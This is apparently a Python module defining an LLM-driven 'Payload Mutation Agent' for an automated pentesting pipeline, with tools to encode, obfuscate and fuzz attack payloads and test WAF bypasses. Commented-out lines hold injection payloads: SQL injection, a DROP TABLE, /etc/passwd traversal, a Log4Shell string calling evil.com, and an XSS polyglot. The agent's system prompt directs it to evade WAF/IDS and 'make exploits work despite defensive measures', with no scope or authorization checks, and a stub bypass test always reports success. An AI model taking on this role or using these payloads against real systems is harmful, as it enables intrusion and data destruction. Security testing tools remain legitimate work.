"""Payload Mutation Agent for evasion and fuzzing."""
from __future__ import annotations

from typing import List, Optional

from openai_agents import Agent, function_tool
from temporalio import workflow

from project.constants import OPENAI_MODEL


@function_tool
async def mutate_payload(
    original_payload: str,
    mutation_type: str,
    task_id: str,
) -> str:
    """
    Mutate a payload to evade detection or bypass filters.

    Call this when:
    - Original payload is blocked by WAF/IDS
    - Need to bypass input validation
    - Testing different encoding/obfuscation techniques

    Args:
        original_payload: The original payload
        mutation_type: Type of mutation ("encoding", "obfuscation", "case_variation", "null_byte")
        task_id: Task ID for tracing

    Returns:
        JSON string with mutated payloads
    """
    import json
    import base64
    import urllib.parse

    workflow.logger.info(f"Mutating payload with {mutation_type}")

    mutations = []

    if mutation_type == "encoding":
        # URL encoding
        mutations.append({
            "type": "URL encoding",
            "payload": urllib.parse.quote(original_payload),
        })

        # Double URL encoding
        mutations.append({
            "type": "Double URL encoding",
            "payload": urllib.parse.quote(urllib.parse.quote(original_payload)),
        })

        # Base64 encoding
        mutations.append({
            "type": "Base64 encoding",
            "payload": base64.b64encode(original_payload.encode()).decode(),
        })

        # Hex encoding
        mutations.append({
            "type": "Hex encoding",
            "payload": original_payload.encode().hex(),
        })

    elif mutation_type == "obfuscation":
        # Case variation
        mutations.append({
            "type": "Mixed case",
            "payload": "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(original_payload)),
        })

        # Comment injection (for SQL)
        if "select" in original_payload.lower() or "union" in original_payload.lower():
            mutations.append({
                "type": "SQL comment injection",
                "payload": original_payload.replace(" ", "/**/"),
            })

    elif mutation_type == "case_variation":
        mutations.append({
            "type": "Uppercase",
            "payload": original_payload.upper(),
        })

        mutations.append({
            "type": "Lowercase",
            "payload": original_payload.lower(),
        })

        mutations.append({
            "type": "Title case",
            "payload": original_payload.title(),
        })

    elif mutation_type == "null_byte":
        mutations.append({
            "type": "Null byte injection",
            "payload": original_payload + "%00",
        })

        mutations.append({
            "type": "Null byte prefix",
            "payload": "%00" + original_payload,
        })

    result = {
        "original_payload": original_payload,
        "mutation_type": mutation_type,
        "mutations_generated": len(mutations),
        "mutations": mutations,
    }

    return json.dumps(result)


@function_tool
async def test_waf_bypass(
    payload: str,
    target_url: str,
    waf_type: str,
    task_id: str,
) -> str:
    """
    Test if a payload can bypass Web Application Firewall (WAF).

    Call this when:
    - Payload is being blocked
    - Need to identify WAF rules
    - Testing evasion techniques

    Args:
        payload: The payload to test
        target_url: Target URL
        waf_type: Type of WAF if known (e.g., "ModSecurity", "Cloudflare", "AWS WAF")
        task_id: Task ID for tracing

    Returns:
        JSON string with bypass test results
    """
    import json

    workflow.logger.info(f"Testing WAF bypass for {waf_type}")

    # Simulated WAF bypass testing - in production, this would test actual WAF
    result = {
        "payload": payload,
        "target_url": target_url,
        "waf_type": waf_type,
        "blocked": False,
        "bypass_successful": True,
        "response_code": 200,
        "detection_signatures": [],
        "recommendations": [
            "Try encoding variations",
            "Use case manipulation",
            "Add null bytes or comments",
        ],
    }

    return json.dumps(result)


@function_tool
async def encode_payload(
    payload: str,
    encoding_scheme: str,
    task_id: str,
) -> str:
    """
    Encode payload using various encoding schemes.

    Call this when:
    - Need to bypass input filters
    - Evading signature-based detection
    - Testing different encoding methods

    Args:
        payload: The payload to encode
        encoding_scheme: Encoding to use ("base64", "url", "hex", "unicode", "html")
        task_id: Task ID for tracing

    Returns:
        Encoded payload string
    """
    import base64
    import urllib.parse
    import html

    workflow.logger.info(f"Encoding payload with {encoding_scheme}")

    if encoding_scheme == "base64":
        return base64.b64encode(payload.encode()).decode()

    elif encoding_scheme == "url":
        return urllib.parse.quote(payload)

    elif encoding_scheme == "hex":
        return payload.encode().hex()

    elif encoding_scheme == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    elif encoding_scheme == "html":
        return html.escape(payload)

    else:
        return payload


@function_tool
async def fuzz_parameter(
    parameter_name: str,
    parameter_type: str,
    fuzzing_strategy: str,
    task_id: str,
) -> str:
    """
    Generate fuzzing payloads for a parameter.

    Call this when:
    - Testing input validation
    - Looking for injection points
    - Discovering hidden functionality

    Args:
        parameter_name: Name of the parameter to fuzz
        parameter_type: Type of parameter ("string", "integer", "boolean", "array")
        fuzzing_strategy: Strategy to use ("boundary", "injection", "overflow", "special_chars")
        task_id: Task ID for tracing

    Returns:
        JSON string with fuzzing payloads
    """
    import json

    workflow.logger.info(f"Generating fuzzing payloads for {parameter_name}")

    payloads = []

    if fuzzing_strategy == "boundary":
        if parameter_type == "integer":
            payloads = [
                {"value": -1, "description": "Negative number"},
                {"value": 0, "description": "Zero"},
                {"value": 1, "description": "One"},
                {"value": 2147483647, "description": "Max 32-bit int"},
                {"value": 2147483648, "description": "Max 32-bit int + 1"},
                {"value": -2147483648, "description": "Min 32-bit int"},
            ]
        elif parameter_type == "string":
            payloads = [
                {"value": "", "description": "Empty string"},
                {"value": " ", "description": "Single space"},
                {"value": "A" * 1000, "description": "Long string (1000 chars)"},
                {"value": "A" * 10000, "description": "Very long string (10000 chars)"},
            ]

    elif fuzzing_strategy == "injection":
        # HARDCODED PAYLOADS COMMENTED OUT - Use LLM generation instead
        # payloads = [
        #     {"value": "' OR '1'='1", "description": "SQL injection"},
        #     {"value": "<script>alert(1)</script>", "description": "XSS"},
        #     {"value": "'; DROP TABLE users--", "description": "SQL DROP"},
        #     {"value": "../../../etc/passwd", "description": "Path traversal"},
        #     {"value": "${jndi:ldap://evil.com/a}", "description": "Log4Shell"},
        # ]
        # Return empty - LLM should generate these payloads
        payloads = []
        workflow.logger.warning(f"Injection fuzzing requested for {parameter_name} - use LLM-based payload generation")

    elif fuzzing_strategy == "overflow":
        payloads = [
            {"value": "A" * 100, "description": "100 bytes"},
            {"value": "A" * 1000, "description": "1KB"},
            {"value": "A" * 10000, "description": "10KB"},
            {"value": "A" * 100000, "description": "100KB"},
        ]

    elif fuzzing_strategy == "special_chars":
        payloads = [
            {"value": "!@#$%^&*()", "description": "Special characters"},
            {"value": "\\x00\\x01\\x02", "description": "Null bytes"},
            {"value": "\n\r\t", "description": "Whitespace chars"},
            {"value": "'; -- ", "description": "SQL comment"},
        ]

    result = {
        "parameter_name": parameter_name,
        "parameter_type": parameter_type,
        "fuzzing_strategy": fuzzing_strategy,
        "payloads_generated": len(payloads),
        "payloads": payloads,
    }

    return json.dumps(result)


@function_tool
async def generate_polyglot_payload(
    target_contexts: List[str],
    task_id: str,
) -> str:
    """
    Generate polyglot payloads that work in multiple contexts.

    Call this when:
    - Payload needs to work in multiple injection contexts
    - Bypassing multiple filters simultaneously
    - Creating universal exploits

    Args:
        target_contexts: List of contexts (e.g., ["sql", "xss", "command"])
        task_id: Task ID for tracing

    Returns:
        JSON string with polyglot payloads
    """
    import json

    workflow.logger.info(f"Generating polyglot for contexts: {target_contexts}")

    # HARDCODED POLYGLOT PAYLOADS COMMENTED OUT - Use LLM generation instead
    polyglots = []

    # if "sql" in target_contexts and "xss" in target_contexts:
    #     polyglots.append({
    #         "payload": "'-alert(1)-'",
    #         "contexts": ["SQL", "XSS"],
    #         "description": "Works as both SQL string terminator and XSS",
    #     })

    # if "command" in target_contexts:
    #     polyglots.append({
    #         "payload": "; echo 'test' #",
    #         "contexts": ["Command Injection", "SQL"],
    #         "description": "Command separator that also works as SQL comment",
    #     })

    # polyglots.append({
    #     "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>/\\x3e",
    #     "contexts": ["XSS (multiple contexts)"],
    #     "description": "Universal XSS polyglot",
    # })

    # Return empty - LLM should generate polyglot payloads
    workflow.logger.warning(f"Polyglot generation requested for contexts {target_contexts} - use LLM-based payload generation")

    result = {
        "target_contexts": target_contexts,
        "polyglots_generated": len(polyglots),
        "polyglots": polyglots,
    }

    return json.dumps(result)


def new_payload_mutation_agent(
    blocked_payloads: Optional[List[str]] = None,
    waf_type: Optional[str] = None,
    task_id: str = "",
) -> Agent:
    """
    Create a Payload Mutation Agent for evasion and fuzzing.

    This agent specializes in:
    - Payload mutation and obfuscation
    - WAF/IDS evasion techniques
    - Fuzzing and input validation testing
    - Polyglot payload generation

    Args:
        blocked_payloads: List of payloads that were blocked
        waf_type: Type of WAF detected
        task_id: Task ID for tracing

    Returns:
        Agent configured for payload mutation
    """
    blocked_summary = "No blocked payloads yet"
    if blocked_payloads:
        blocked_summary = f"{len(blocked_payloads)} payloads blocked"

    waf_summary = "No WAF detected"
    if waf_type:
        waf_summary = f"WAF detected: {waf_type}"

    instructions = f"""
You are a Payload Mutation Agent specializing in evasion and fuzzing techniques.

## Current Status

Blocked Payloads: {blocked_summary}
WAF Detection: {waf_summary}

## Your Mission

Mutate and optimize payloads to:
1. Bypass WAF/IDS detection
2. Evade input validation filters
3. Maximize exploit success rate
4. Test edge cases and boundaries

## Your Approach

### Step 1: Analyze Blocking
- Understand why payloads are being blocked
- Identify WAF signatures and rules
- Determine filter mechanisms

### Step 2: Mutation Strategy
- Choose appropriate mutation techniques
- Test encoding variations
- Apply obfuscation methods
- Generate polyglot payloads

### Step 3: Evasion Testing
- Test mutated payloads against WAF
- Iterate based on results
- Combine multiple techniques
- Validate bypass success

### Step 4: Fuzzing
- Generate comprehensive fuzzing payloads
- Test boundary conditions
- Look for unexpected behavior
- Identify injection points

## Tools Available

- `mutate_payload`: Apply mutations to payloads
- `test_waf_bypass`: Test WAF bypass effectiveness
- `encode_payload`: Encode payloads in various schemes
- `fuzz_parameter`: Generate fuzzing payloads
- `generate_polyglot_payload`: Create multi-context payloads

## Mutation Techniques

### Encoding
- URL encoding (single and double)
- Base64 encoding
- Hex encoding
- Unicode encoding
- HTML entity encoding

### Obfuscation
- Case variation (mixed, upper, lower)
- Comment injection (SQL, JavaScript)
- Whitespace manipulation
- String concatenation
- Character substitution

### Evasion
- Null byte injection
- Path traversal variations
- Protocol smuggling
- HTTP parameter pollution
- CRLF injection

### Fuzzing Strategies
- Boundary value testing
- Injection payload testing
- Buffer overflow attempts
- Special character testing
- Type confusion

## WAF Bypass Techniques

### ModSecurity
- Use case variations
- Encode special characters
- Fragment payloads
- Use comments between keywords

### Cloudflare
- Try different encoding schemes
- Use polyglot payloads
- Test rate limiting bypass
- Fragment requests

### AWS WAF
- Test regex bypass techniques
- Use encoding variations
- Try request smuggling
- Test header manipulation

## Polyglot Payloads

Create payloads that work in multiple contexts:
- SQL + XSS polyglots
- Command + SQL polyglots
- Universal XSS polyglots
- Multi-language polyglots

## Important Guidelines

- Start with simple mutations, then increase complexity
- Test each mutation to verify it works
- Document which techniques bypass which filters
- Combine multiple techniques for stubborn filters
- Always verify the mutated payload still exploits the vulnerability
- Keep track of successful evasion techniques for learning

## Output Format

For each mutation attempt, provide:

1. **Original Payload**: What you started with
2. **Mutation Applied**: Technique used
3. **Mutated Payload**: Result of mutation
4. **Test Results**: Did it bypass the filter?
5. **Success Rate**: How effective was this technique?
6. **Recommendations**: Next steps if blocked

## Example Workflow

```
1. Original payload blocked: ' OR 1=1--
2. Applied URL encoding: %27%20OR%201%3D1--
3. Still blocked - WAF detected SQL keywords
4. Applied case variation: ' oR 1=1--
5. Still blocked - trying obfuscation
6. Applied comment injection: '/**/OR/**/1=1--
7. SUCCESS - bypassed WAF!
8. Documented: Comment injection works for this WAF
```

Remember: Your goal is to make exploits work despite defensive measures.
Be creative, persistent, and systematic!
"""

    return Agent(
        name="Payload Mutation Agent",
        instructions=instructions,
        model=OPENAI_MODEL,
        tools=[
            mutate_payload,
            test_waf_bypass,
            encode_payload,
            fuzz_parameter,
            generate_polyglot_payload,
        ],
    )